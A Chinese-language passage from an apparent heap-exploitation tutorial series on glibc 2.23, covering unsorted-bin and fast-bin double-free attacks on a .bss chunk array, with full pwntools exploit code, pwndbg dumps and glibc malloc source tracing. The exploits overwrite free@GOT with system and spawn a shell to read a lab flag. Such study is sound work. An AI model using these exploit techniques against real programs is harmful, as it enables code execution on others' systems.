data_payload = p64(0) * 3 + p64(0x20)
data_payload += p64(0) + p64(0x004040C0)
edit(0, name_payload, len(data_payload), data_payload)
# pwndbg> x/8gx &chunks[0].name
# 0x4040c0 <chunks>:      0x0000000000000000      0x0000000000000090 <= fake size
# 0x4040d0 <chunks+16>:   0x0000000000000000      0x00000000004040c0 <= fake bk
# 0x4040e0 <chunks+32>:   0x0000000000000030      0x0000000009385010
# 0x4040f0 <chunks+48>:   0x4242424242424242      0x4242424242424242
# pwndbg> x/8gx 0x9385000
# 0x9385000:      0x0000000000000000      0x0000000000000021 <= chunk 0
# 0x9385010:      0x0000000000000000      0x0000000000000000
# 0x9385020:      0x0000000000000000      0x0000000000000020 <= chunk 1
# 0x9385030:      0x0000000000000000      0x00000000004040c0
# pwndbg>
malloc(3, p64(0), 0x80, p64(0))
# pwndbg> x/1gx &chunks[3].addr
# 0x404178 <chunks+184>:  0x00000000004040d0
# pwndbg> x/8gx 0x00000000004040d0-0x10
# 0x4040c0 <chunks>:      0x0000000000000000      0x0000000000000090 <= chunk 3
# 0x4040d0 <chunks+16>:   0x0000000000000000      0x00000000004040c0
# 0x4040e0 <chunks+32>:   0x0000000000000030      0x0000000009385010 <= chunk 0
# 0x4040f0 <chunks+48>:   0x4242424242424242      0x4242424242424242
# pwndbg>
payload = b"/bin/sh\x00" + p64(0) + p64(0x30) + p64(0x00404000)
edit(3, p64(0), len(payload), payload)
# pwndbg> x/8gx 0x00000000004040d0-0x10
# 0x4040c0 <chunks>:      0x0000000000000000      0x0000000000000090 <= chunk 3
# 0x4040d0 <chunks+16>:   0x0068732f6e69622f      0x0000000000000000
# 0x4040e0 <chunks+32>:   0x0000000000000030      0x0000000000404000 <= chunk 0
# 0x4040f0 <chunks+48>:   0x4242424242424242      0x4242424242424242
# pwndbg> x/4gx 0x0000000000404000
# 0x404000 <free@got.plt>:        0x00007f8d31473a9b      0x00007f8d31462d19
# 0x404010 <write@got.plt>:       0x00007f8d314d4020      0x00007f8d3147c380
# pwndbg>
edit(0, p64(0), 0x8, p64(libc.sym["system"]))
delete(3)
cmd = b"cat src/2.23/unsorted_bin_attack_bss/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

运行至show(1)，heap相关布局如下：

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x2fbc8000
Size: 0x20 (with flag bits: 0x21)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x2fbc8020
Size: 0x90 (with flag bits: 0x91)
fd: 0x7f4c84d8db78
bk: 0x7f4c84d8db78

Allocated chunk
Addr: 0x2fbc80b0
Size: 0x90 (with flag bits: 0x90)

Top chunk | PREV_INUSE
Addr: 0x2fbc8140
Size: 0x20ec0 (with flag bits: 0x20ec1)

pwndbg> unsortedbin 
unsortedbin
all: 0x2fbc8020 —▸ 0x7f4c84d8db78 (main_arena+88) ◂— 0x2fbc8020
```

运行edit(0, name_payload, len(data_payload), data_payload)处，heap相关布局如下：

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x2fbc8000
Size: 0x20 (with flag bits: 0x21)

Free chunk (unsortedbin)
Addr: 0x2fbc8020
Size: 0x20 (with flag bits: 0x20)
fd: 0x00
bk: 0x4040c0

Allocated chunk | IS_MMAPED
Addr: 0x2fbc8040
Size: 0x4242424242424240 (with flag bits: 0x4242424242424242)

pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x2fbc8020 ◂— 0
BK: 0x2fbc8020 —▸ 0x4040c0 (chunks) ◂— 0x4040c0 (chunks)

pwndbg> x/6gx &chunks[0] 
0x4040c0 <chunks>:      0x0000000000000000      0x0000000000000090 <= fake size
0x4040d0 <chunks+16>:   0x0000000000000000      0x00000000004040c0 <= fake bk
0x4040e0 <chunks+32>:   0x0000000000000030      0x000000002fbc8010
pwndbg> x/8gx 0x000000002fbc8010-0x10 
0x2fbc8000:     0x0000000000000000      0x0000000000000021 <= chunk 0
0x2fbc8010:     0x0000000000000000      0x0000000000000000
0x2fbc8020:     0x0000000000000000      0x0000000000000020 <= chunk 1
0x2fbc8030:     0x0000000000000000      0x00000000004040c0
```

chunkB大小由0x91修改为0x20，unsortedbin->bk则修改为0x4040c0 (chunks)。
接下来申请0x80大小，进入_int_malloc

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3472
   3466 
   3467   for (;; )
   3468     {
   3469       int iters = 0;
   3470       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
   3471         {
 ► 3472           bck = victim->bk;
 
pwndbg> p/x victim
$2 = 0x2fbc8020
pwndbg> p/x victim->bk
$3 = 0x4040c0

In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3521
   3515           /* remove from unsorted list */
   3516           unsorted_chunks (av)->bk = bck;
   3517           bck->fd = unsorted_chunks (av);
   3518 
   3519           /* Take now instead of binning if exact fit */
   3520 
 ► 3521           if (size == nb)
 
pwndbg> p/x size
$7 = 0x20
pwndbg> p/x nb
$8 = 0x90
```

由于victim->size被修改为0x20，跳过`if (size == nb)`, 进入small bin逻辑。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3537
   3531 
   3532           /* place chunk in bin */
   3533 
   3534           if (in_smallbin_range (size))
   3535             {
   3536               victim_index = smallbin_index (size);
 ► 3537               bck = bin_at (av, victim_index);
   3538               fwd = bck->fd;
   
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3590
   3584               else
   3585                 victim->fd_nextsize = victim->bk_nextsize = victim;
   3586             }
   3587 
   3588           mark_bin (av, victim_index);
   3589           victim->bk = bck;
 ► 3590           victim->fd = fwd;
   3591           fwd->bk = victim;
   3592           bck->fd = victim;
   3593 
   3594 #define MAX_ITERS       10000
   3595           if (++iters >= MAX_ITERS)
   3596             break;
   3597         }
```

没有什么可注意的校验，此时开始进入第二次循环。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3472
   3466 
   3467   for (;; )
   3468     {
   3469       int iters = 0;
   3470       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
   3471         {
 ► 3472           bck = victim->bk;
 
pwndbg> p/x victim
$11 = 0x4040c0
pwndbg> p/x victim->bk
$12 = 0x4040c0
pwndbg> x/4gx 0x4040c0
0x4040c0 <chunks>:      0x0000000000000000      0x0000000000000090
0x4040d0 <chunks+16>:   0x00007f4c84d8db78      0x00000000004040c0
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x2fbc8020 —▸ 0x7f4c84d8db88 (main_arena+104) ◂— 0x2fbc8020
BK: 0x4040c0 (chunks) ◂— 0x4040c0 (chunks)
pwndbg> smallbins 
smallbins
0x20: 0x2fbc8020 —▸ 0x7f4c84d8db88 (main_arena+104) ◂— 0x2fbc8020

In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3517
   3511               alloc_perturb (p, bytes);
   3512               return p;
   3513             }
   3514 
   3515           /* remove from unsorted list */
   3516           unsorted_chunks (av)->bk = bck;
 ► 3517           bck->fd = unsorted_chunks (av);

pwndbg> p/x bck
$15 = 0x4040c0
pwndbg> p/x bck->fd
$16 = 0x7f4c84d8db78
```

要求构造的bck->fd是可写的地址，这是重要的一个要求。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3521
   3515           /* remove from unsorted list */
   3516           unsorted_chunks (av)->bk = bck;
   3517           bck->fd = unsorted_chunks (av);
   3518 
   3519           /* Take now instead of binning if exact fit */
   3520 
 ► 3521           if (size == nb)
 
pwndbg> p/x size
$17 = 0x90
pwndbg> p/x nb
$18 = 0x90
```

这次构造的fake chunk满足申请要求，返回用户。

```bash
pwndbg> p/x chunks[3]
$19 = {
  name = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0 <repeats 23 times>},
  size = 0x80,
  addr = 0x4040d0
}
```

此时chunks[3].addr成功获取到.bss的地址。接下来利用就轻车熟路了，不再赘述！

### 1-7 fast bin attack bss

核心原理参考fast bin attack，此处不在赘述。唯一需要指出的是，glibc的fast bin管理不善，可以出现double free情况，实现两次申请到同一个chunk。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/06/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/fast_bin_attack_bss/exploit.py)。

核心利用代码如下：

```python
# unsorted bin leak
malloc(0, b"A" * 0x20, 0x80, b"A" * 0x80)
malloc(1, b"B" * 0x20, 0x80, b"B" * 0x80)
delete(0)
show(0)
libc_leak = u64(conn.recv(6).ljust(8, b"\x00"))
log.info(f"libc leak: {hex(libc_leak)}")
libc.address = libc_leak - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")
malloc(0, b"A" * 0x20, 0x80, b"A" * 0x80)
edit(0, p64(0) + p64(0x20), 0x8, p64(0))
# pwndbg> x/4gx &chunks[0].name
# 0x4040c0 <chunks>:      0x0000000000000000      0x0000000000000020 <= fake chunk
# 0x4040d0 <chunks+16>:   0x4141414141414141      0x4141414141414141
# pwndbg>

# fast bin attack bss
malloc(2, b"A" * 0x20, 0x18, b"A" * 0x18)
malloc(3, b"B" * 0x20, 0x18, b"B" * 0x18)
malloc(4, b"C" * 0x20, 0x18, b"C" * 0x18)
delete(2)
delete(3)
delete(2)
# pwndbg> fastbins
# fastbins
# 0x20: 0x1a3c2120 —▸ 0x1a3c2140 ◂— 0x1a3c2120  <=  2 -> 3 <- 2
# pwndbg>
malloc(5, b"D" * 0x20, 0x18, b"D" * 0x18)
malloc(6, b"E" * 0x20, 0x18, b"E" * 0x18)
# pwndbg> fastbins
# fastbins
# 0x20: 0x1a3c2120 ◂— 'DDDDDDDDDDDDDDDDDDDDDDDD!'  <= 2
# pwndbg>
edit(5, p64(0), 0x8, p64(0x004040C0 + 0x8 - 0x8))
# pwndbg> fastbins
# fastbins
# 0x20: 0x1a3c2120 —▸ 0x4040c0 (chunks) ◂— 0x4141414141414141 ('AAAAAAAA') <= 2 -> fake chunk
# pwndbg>
malloc(7, b"F" * 0x20, 0x18, b"F" * 0x18)
malloc(8, b"G" * 0x20, 0x18, b"G" * 0x18)
# pwndbg> x/1gx &chunks[8].addr
# 0x404268 <chunks+424>:  0x00000000004040d0
# pwndbg> x/4gx 0x00000000004040d0
# 0x4040d0 <chunks+16>:   0x4747474747474747      0x4747474747474747  <= chunk 8
# 0x4040e0 <chunks+32>:   0x4747474747474747      0x000000001a3c2010  <= chunk 0
# pwndbg>
# pwndbg> x/1gx &chunks[0].addr
# 0x4040e8 <chunks+40>:   0x000000001a3c2010
# pwndbg>
payload = b"/bin/sh\x00" + p64(0)
payload += p64(0) + p64(0x00404000)
edit(8, p64(0), len(payload), payload)
# pwndbg> x/4gx 0x00000000004040d0
# 0x4040d0 <chunks+16>:   0x0068732f6e69622f      0x0000000000000000
# 0x4040e0 <chunks+32>:   0x0000000000000000      0x0000000000404000  <= chunk 0 | got fake chunk
# pwndbg> x/4gx 0x0000000000404000
# 0x404000 <free@got.plt>:        0x00007888d4c73a9b      0x00007888d4c62d19
# 0x404010 <write@got.plt>:       0x00007888d4cd4020      0x00007888d4c7c380
# pwndbg>
edit(0, p64(0), 0x8, p64(libc.sym["system"]))
# pwndbg> x/4gx 0x0000000000404000
# 0x404000 <free@got.plt>:        0x00007888d4c3c3eb      0x00007888d4c62d19
# 0x404010 <write@got.plt>:       0x00007888d4cd4020      0x00007888d4c7c380
# pwndbg> x/5i 0x00007888d4c3c3eb
#    0x7888d4c3c3eb <__libc_system>:      sub    rsp,0x8
#    0x7888d4c3c3ef <__libc_system+4>:    test   rdi,rdi
#    0x7888d4c3c3f2 <__libc_system+7>:    jne    0x7888d4c3c40a <__libc_system+31>
#    0x7888d4c3c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x7888d4d56d7b
#    0x7888d4c3c3fb <__libc_system+16>:   call   0x7888d4c3be36 <do_system>
# pwndbg>
delete(8)
cmd = b"cat src/2.23/fast_bin_attack_bss/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

一次申请chunkA、chunkB、chunkC，按照chunkA->chunkB->chunkA的顺序释放，实现fastbin存在两个chunkA

```bash
pwndbg> fastbins
fastbins
0x20: 0x1a3c2120 —▸ 0x1a3c2140 ◂— 0x1a3c2120  <=  2 -> 3 <- 2
pwndbg>
```

这是double free的简易演示。

```bash
pwndbg> fastbins
fastbins
0x20: 0x1a3c2120 —▸ 0x4040c0 (chunks) ◂— 0x4141414141414141 ('AAAAAAAA') <= 2 -> fake chunk
pwndbg>
```

接着按照fast bin attack的核心原理，在.bss构造fake chunk。经过连续两次申请，成功获取.bss控制权。

### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
